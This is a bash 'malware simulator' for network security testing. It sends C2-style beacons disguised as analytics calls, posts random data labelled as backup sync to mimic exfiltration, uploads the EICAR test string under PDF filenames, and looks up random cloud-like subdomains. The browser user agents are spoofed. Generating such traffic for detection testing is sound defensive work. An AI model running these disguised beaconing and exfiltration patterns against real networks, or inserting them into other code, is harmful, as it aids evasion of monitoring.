#!/bin/bash
# Malware Simulator
# Simulates various malware behaviors for network security testing
# Version: 1.0

set +e

LOG_FILE="/app/logs/malware.log"
CONTAINER_IP=$(hostname -I | awk '{print $1}')

# Default configuration
TARGET_IP="${TARGET_IP:-192.168.6.131}"
TARGET_PORT="${TARGET_PORT:-5000}"
C2_INTERVAL="${C2_BEACON_INTERVAL:-15}"
EXFIL_INTERVAL="${EXFIL_INTERVAL:-25}"
EICAR_INTERVAL="${EICAR_INTERVAL:-40}"
DNS_INTERVAL="${DNS_ATTACK_INTERVAL:-20}"

log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Analytics Tracking Simulation (C2 disguised as analytics)
analytics_tracking() {
    while true; do
        local tracking_data="{\"device_id\":\"device_analytics_001\",\"type\":\"event\",\"host\":\"$CONTAINER_IP\",\"timestamp\":\"$(date -u +%s)\"}"
        
        if curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "X-Session-ID: $(uuidgen)" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
            -d "$tracking_data" \
            "http://${TARGET_IP}:${TARGET_PORT}/api/v1/metrics/track" >/dev/null 2>&1; then
            log_message "[ANALYTICS] Tracking beacon sent successfully"
        else
            log_message "[ANALYTICS] Tracking failed"
        fi
        
        sleep "$C2_INTERVAL"
    done
}

# Backup Sync Simulation (Data exfiltration disguised as backup)
backup_sync() {
    local counter=1
    
    while true; do
        local data_size=$((RANDOM % 5000 + 1000))
        local backup_data=$(head -c "$data_size" </dev/urandom | base64 -w 0 | head -c "$data_size")
        
        local payload="{\"device_id\":\"device_backup_001\",\"type\":\"incremental\",\"data\":\"$backup_data\",\"size\":$data_size,\"seq\":$counter}"
        
        if curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "X-Client-Version: 4.7.2" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" \
            -d "$payload" \
            "http://${TARGET_IP}:${TARGET_PORT}/api/v2/cloud/sync" >/dev/null 2>&1; then
            log_message "[BACKUP] Synced $data_size bytes (seq: $counter)"
        else
            log_message "[BACKUP] Sync failed"
        fi
        
        if curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "X-Client-Version: 4.7.2" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" \
            -d "$payload" \
            "http://${TARGET_IP}:${TARGET_PORT}/api/v2/cloud/sync" >/dev/null 2>&1; then
            log_message "[BACKUP] Synced $data_size bytes (seq: $counter)"
        else
            log_message "[BACKUP] Sync failed"
        fi
        
        counter=$((counter + 1))
        sleep "$EXFIL_INTERVAL"
    done
}

# File Upload Simulation (Malware upload disguised as document upload)
file_upload() {
    local eicar_string='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    local counter=1
    
    while true; do
        local filename="report_${counter}_$(date +%Y%m%d).pdf"
        
        local payload="{\"device_id\":\"device_upload_001\",\"type\":\"attachment\",\"filename\":\"$filename\",\"content\":\"$eicar_string\",\"size\":${#eicar_string}}"
        
        if curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "X-Upload-Source: desktop" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" \
            -d "$payload" \
            "http://${TARGET_IP}:${TARGET_PORT}/api/v1/files/upload" >/dev/null 2>&1; then
            log_message "[UPLOAD] Uploaded file: $filename"
        else
            log_message "[UPLOAD] Upload failed"
        fi
        
        counter=$((counter + 1))
        sleep "$EICAR_INTERVAL"
    done
}

# DNS Lookup Simulation (DGA domains disguised as random subdomains)
dns_lookups() {
    local domains=(
        "cdn-$(uuidgen | cut -d'-' -f1).cloudflare.net"
        "api-$(uuidgen | cut -d'-' -f1).azure.com"
        "storage-$(uuidgen | cut -d'-' -f1).googleapis.com"
        "edge-$(uuidgen | cut -d'-' -f1).akamai.net"
    )
    
    while true; do
        for domain in "${domains[@]}"; do
            nslookup "$domain" >/dev/null 2>&1 || true
            log_message "[DNS] Lookup query: $domain"
        done
        
        sleep "$DNS_INTERVAL"
    done
}

cleanup() {
    log_message "Stopping malware simulator"
    jobs -p | xargs -r kill 2>/dev/null || true
    exit 0
}

trap cleanup SIGTERM SIGINT

# Main execution
log_message "========================================="
log_message "Malware Simulator Started"
log_message "Container IP: $CONTAINER_IP"
log_message "Target: $TARGET_IP:$TARGET_PORT"
log_message "========================================="

# Start all behaviors in background
analytics_tracking &
log_message "Analytics Tracking started (interval: ${C2_INTERVAL}s)"

backup_sync &
log_message "Backup Sync started (interval: ${EXFIL_INTERVAL}s)"

file_upload &
log_message "File Upload started (interval: ${EICAR_INTERVAL}s)"

dns_lookups &
log_message "DNS Lookups started (interval: ${DNS_INTERVAL}s)"

log_message "All behaviors running"
log_message "========================================="

# Keep running
while true; do
    sleep 60
    log_message "Status: All behaviors active"
done
